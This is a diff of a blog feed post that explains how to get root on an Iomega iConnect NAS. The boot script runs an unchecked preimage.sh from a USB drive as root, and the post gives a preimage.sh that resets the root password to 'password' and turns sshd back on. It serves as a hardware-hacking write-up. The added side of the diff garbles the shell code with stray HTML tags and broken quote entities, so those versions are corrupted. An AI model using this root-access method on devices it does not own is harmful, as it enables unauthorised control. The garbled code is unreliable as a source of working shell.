@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[goto.fail]]></title>
-  <link href="http://goto.fail/atom.xml" rel="self"/>
+  <title><![CDATA[Category: Iomega | goto.fail]]></title>
+  <link href="http://goto.fail/blog/categories/iomega/atom.xml" rel="self"/>
   <link href="http://goto.fail/"/>
   <updated>2014-09-04T15:17:36-05:00</updated>
   <id>http://goto.fail/</id>
@@ -25,9 +25,9 @@
 
 <p>The <a href="http://iomega.com/about/prreleases/2010/010510_iconnect.html">iConnect</a> was billed as a &ldquo;wireless data station&rdquo; - kind of a NAS of sorts, but with an emphasis on media streaming. All of the information I could find on the iConnect was from 2010 at the latest, so I&rsquo;m guessing these things aren&rsquo;t still being made, but if you happen to get your hands on one, here&rsquo;s how I managed to get root access on it.</p>
 
-<p><img class="left" src="http://goto.fail/images/iconnect_uart.png" width="500" height="375"> When you crack open the case you can see that, despite the slim form factor, good guy Iomega still manages to keep some header pins for UART access on the board. Connecting to these pins allows you to watch dmesg output during boot and ends with a login prompt. If you already know the root login you could simply get full control of the device this way, but since you&rsquo;re reading this post I&rsquo;m going to assume you don&rsquo;t. Let&rsquo;s take a closer look at some of the dmesg output.</p>
+<p><img class="left" src="/images/iconnect_uart.png" width="500" height="375"> When you crack open the case you can see that, despite the slim form factor, good guy Iomega still manages to keep some header pins for UART access on the board. Connecting to these pins allows you to watch dmesg output during boot and ends with a login prompt. If you already know the root login you could simply get full control of the device this way, but since you&rsquo;re reading this post I&rsquo;m going to assume you don&rsquo;t. Let&rsquo;s take a closer look at some of the dmesg output.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -40,12 +40,11 @@
 </span><span class='line'>usb 1-1: configuration #1 chosen from 1 choice
 </span><span class='line'>hub 1-1:1.0: USB hub found
 </span><span class='line'>hub 1-1:1.0: 4 ports detected
-</span><span class='line'>mount: mounting /dev/sda1 on /usb_drive failed: No such device or address</span></code></pre></td></tr></table></div></figure>
-
+</span><span class='line'>mount: mounting /dev/sda1 on /usb_drive failed: No such device or address</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>So, during boot it attempts to mount /dev/sda1 as /usb_drive. That&rsquo;s good to know! I wonder what happens if we stick a thumb drive in and boot it up again&hellip;</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -66,16 +65,15 @@
 </span><span class='line'>hub 1-1:1.0: 4 ports detected
 </span><span class='line'>usb 1-1.2: new high speed USB device using orion-ehci and address 3
 </span><span class='line'>usb 1-1.2: configuration #1 chosen from 1 choice
-</span><span class='line'>...&lt;snip>...
+</span><span class='line'>&hellip;&lt;snip>&hellip;
 </span><span class='line'>FAT: utf8 is not a recommended IO charset for FAT filesystems, filesystem will be case sensitive!
-</span><span class='line'>Checking for pre-image script... none.
+</span><span class='line'>Checking for pre-image script&hellip; none.
 </span><span class='line'>Image tar file not found: /usb_drive/emctools/iconnect_images/*.tgz
-</span><span class='line'>No valid image in USB, start normal boot</span></code></pre></td></tr></table></div></figure>
-
+</span><span class='line'>No valid image in USB, start normal boot</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Looks like it&rsquo;s having trouble finding some of the files it&rsquo;s looking for. I&rsquo;m sure we can help with that. The script that is doing the heavy lifting here is /initrd/mount_images.sh which tries to mount USB and, if successful, executes a couple of functions called &ldquo;run_preimage_script&rdquo; and &ldquo;extract_validate_image&rdquo;.</p>
 
-<figure class='code'><figcaption><span>/initrd/mount_images.sh </span></figcaption>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>/initrd/mount_images.sh </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -120,11 +118,11 @@
 <span class='line-number'>42</span>
 <span class='line-number'>43</span>
 <span class='line-number'>44</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nb">echo</span> <span class="s2">&quot;USB Device node is $USB_DEVICE&quot;</span>
-</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Checking if there is an attached EMC Imager&quot;</span>
-</span><span class='line'>sleep 10
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>USB Device node is <span class="nv">$USB_DEVICE</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>Checking <span class="k">if</span> there is an attached EMC Imager<span class="p">&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'>sleep 10&lt;/p&gt;
 </span><span class='line'>
-</span><span class='line'>mkdir -p /usb_drive
+</span><span class='line'>&lt;p&gt;mkdir -p /usb_drive
 </span><span class='line'>mount <span class="nv">$USB_DEVICE</span> /usb_drive -t vfat -o async,rw,fmask<span class="o">=</span>0000,dmask<span class="o">=</span>0000,iocharset<span class="o">=</span>utf8
 </span><span class='line'><span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> -eq <span class="m">0</span> <span class="o">]</span>
 </span><span class='line'><span class="k">then</span>
@@ -133,16 +131,16 @@
 </span><span class='line'>        extract_validate_image
 </span><span class='line'>        <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> -eq <span class="m">0</span> <span class="o">]</span>
 </span><span class='line'>        <span class="k">then</span>
-</span><span class='line'>                <span class="nb">echo</span> <span class="s2">&quot;Found EMC Imager with valid image...&quot;</span>
+</span><span class='line'>                <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>Found EMC Imager with valid image<span class="p">&amp;</span>hellip<span class="p">;&amp;</span>rdquo<span class="p">;</span>
 </span><span class='line'>                do_usb_imaging
 </span><span class='line'>                umount /usb_drive
 </span><span class='line'>        <span class="k">else</span>
-</span><span class='line'>                <span class="nb">echo</span> <span class="s2">&quot;No valid image in USB, start normal boot&quot;</span>
+</span><span class='line'>                <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>No valid image in USB, start normal boot<span class="p">&amp;</span>rdquo<span class="p">;</span>
 </span><span class='line'>                umount /usb_drive
 </span><span class='line'>                mkdir -p sysroot/boot
 </span><span class='line'>                ubiattach /dev/ubi_ctrl -m 4
 </span><span class='line'>                mount -t ubifs ubi0:boot sysroot/boot
-</span><span class='line'>                <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> -eq <span class="m">0</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> -f <span class="nv">$APPS_IMAGE</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> -f <span class="nv">$CONFIG_IMAGE</span> <span class="o">]</span>
+</span><span class='line'>                <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> -eq <span class="m">0</span> <span class="o">]</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="o">[</span> -f <span class="nv">$APPS_IMAGE</span> <span class="o">]</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="o">[</span> -f <span class="nv">$CONFIG_IMAGE</span> <span class="o">]</span>
 </span><span class='line'>                <span class="k">then</span>
 </span><span class='line'>                        do_normal_boot
 </span><span class='line'>                <span class="k">else</span>
@@ -155,21 +153,20 @@
 </span><span class='line'>        mkdir -p sysroot/boot
 </span><span class='line'>        ubiattach /dev/ubi_ctrl -m 4
 </span><span class='line'>        mount -t ubifs ubi0:boot sysroot/boot
-</span><span class='line'>        <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> -eq <span class="m">0</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> -f <span class="nv">$APPS_IMAGE</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> -f <span class="nv">$CONFIG_IMAGE</span> <span class="o">]</span>
+</span><span class='line'>        <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> -eq <span class="m">0</span> <span class="o">]</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="o">[</span> -f <span class="nv">$APPS_IMAGE</span> <span class="o">]</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="o">[</span> -f <span class="nv">$CONFIG_IMAGE</span> <span class="o">]</span>
 </span><span class='line'>        <span class="k">then</span>
 </span><span class='line'>                do_normal_boot
 </span><span class='line'>        <span class="k">else</span>
 </span><span class='line'>                umount sysroot/boot
 </span><span class='line'>                do_network_imaging
-</span><span class='line'>        <span class="k">fi</span>
+</span><span class='line'>        <span class="k">fi</span>&lt;/p&gt;
 </span><span class='line'>
-</span><span class='line'><span class="k">fi</span>
-</span></code></pre></td></tr></table></div></figure>
-
+</span><span class='line'>&lt;p&gt;fi
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>These functions are defined in /initrd/common.sh. &ldquo;run_preimage_script&rdquo; sounds interesting. Let&rsquo;s see what it does!</p>
 
-<figure class='code'><figcaption><span>/initrd/common.sh </span></figcaption>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>/initrd/common.sh </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -186,40 +183,56 @@
 <span class='line-number'>14</span>
 <span class='line-number'>15</span>
 <span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="c">###</span>
-</span><span class='line'><span class="c"># Search for and execute (if found) preimage script.</span>
-</span><span class='line'><span class="c">###</span>
-</span><span class='line'>run_preimage_script<span class="o">()</span>
-</span><span class='line'><span class="o">{</span>
-</span><span class='line'>        <span class="nv">preimage_script</span><span class="o">=</span>/usb_drive/emctools/iconnect_images/preimage.sh
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>&lt;/p&gt;
 </span><span class='line'>
-</span><span class='line'>        <span class="nb">echo</span> -n <span class="s2">&quot;Checking for pre-image script... &quot;</span>
-</span><span class='line'>        <span class="k">if</span> <span class="o">[</span> -x <span class="nv">$preimage_script</span> <span class="o">]</span>
-</span><span class='line'>        <span class="k">then</span>
-</span><span class='line'>                <span class="nb">echo</span> <span class="s2">&quot;found.&quot;</span>
-</span><span class='line'>                <span class="nv">$preimage_script</span>
-</span><span class='line'>        <span class="k">else</span>
-</span><span class='line'>                <span class="nb">echo</span> <span class="s2">&quot;none.&quot;</span>
-</span><span class='line'>        <span class="k">fi</span>
-</span><span class='line'><span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
+</span><span class='line'>&lt;h2&gt;#&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;Search <span class="k">for</span> and execute <span class="o">(</span><span class="k">if</span> found<span class="o">)</span> preimage script.&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h2&gt;#&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;run_preimage_script<span class="o">()</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>        <span class="nv">preimage_script</span><span class="o">=</span>/usb_drive/emctools/iconnect_images/preimage.sh&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;    <span class="nb">echo</span> -n <span class="s2">&quot;Checking for pre-image script... &quot;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="o">[</span> -x <span class="nv">$preimage_script</span> <span class="o">]</span>
+</span><span class='line'>    <span class="k">then</span>
+</span><span class='line'>            <span class="nb">echo</span> <span class="s2">&quot;found.&quot;</span>
+</span><span class='line'>            <span class="nv">$preimage_script</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>            <span class="nb">echo</span> <span class="s2">&quot;none.&quot;</span>
+</span><span class='line'>    <span class="k">fi</span>
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Oh dear. So run_preimage_script looks for emctools/iconnect_images/preimage.sh on the USB drive, and, if the file exists, runs it. As root. No questions asked. Told you this is an easy one.</p>
 
 <p>Since this script is being run before the filesystem is fully mounted, we can&rsquo;t just make a call to passwd to modify the root password, but we can use our script to append a call like that to the end of <em>another</em> script that gets executed later on, like linuxrc for instance. While we&rsquo;re at it, I also took the liberty of &ldquo;fixing&rdquo; their /etc/rc2.d/S50sshd file where they disabled sshd by simply commenting out the line where the daemon gets run, and I end up with the following preimage.sh file in the emctools/iconnect_images/ directory of my thumb drive:</p>
 
-<figure class='code'><figcaption><span>/usb_drive/emctools/iconnect_images/preimage.sh </span></figcaption>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>/usb_drive/emctools/iconnect_images/preimage.sh </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="c">#!/bin/sh</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>&lt;/p&gt;
 </span><span class='line'>
-</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;echo -e \&quot;password\\npassword\&quot; | passwd root&quot;</span> &gt;&gt; linuxrc
-</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;sed -i &#39;s/\&quot;Starting sshd: \&quot;/\&quot;Starting sshd: \&quot;\\n\\/usr\\/sbin\\/sshd/&#39; /etc/rc2.d/S50sshd&quot;</span> &gt;&gt; linuxrc
-</span></code></pre></td></tr></table></div></figure>
-
+</span><span class='line'>&lt;h1&gt;!/bin/sh&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;echo <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nb">echo</span> -e <span class="p">&amp;</span><span class="c">#34;password\npassword\&amp;rdquo; | passwd root&amp;#8221; &gt;&gt; linuxrc</span>
+</span><span class='line'><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>sed -i <span class="p">&amp;</span>rsquo<span class="p">;</span>s/<span class="p">&amp;</span><span class="c">#34;Starting sshd: \&amp;rdquo;/\&amp;ldquo;Starting sshd: \&amp;rdquo;\n\/usr\/sbin\/sshd/&amp;lsquo; /etc/rc2.d/S50sshd&amp;#8221; &gt;&gt; linuxrc</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Now, if you boot the iConnect with this thumb drive plugged in, it will run the preimage.sh script which changes the root password to &ldquo;password&rdquo; and starts sshd. Done.</p>
 
